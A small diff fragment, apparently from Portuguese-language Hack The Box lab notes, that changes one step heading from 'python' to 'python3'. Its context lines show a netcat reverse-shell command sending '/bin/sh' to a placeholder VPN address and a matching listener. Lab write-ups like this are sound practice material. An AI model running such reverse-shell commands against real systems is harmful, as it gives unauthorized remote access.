@@ -188,7 +188,7 @@ command > nc -e /bin/sh 10.10.XX.XX YYYY
 > XX é equivalente a seu ip na VPN do HTB. 
 Ele pode ser verificado por meio do comando para Windows: ipconfig ou para Linux: ip addr
 
-3- Verificar se existe python no host remoto
+3- Verificar se existe python3 no host remoto
 
 ```terminal
 $ nc -nvlp 2123
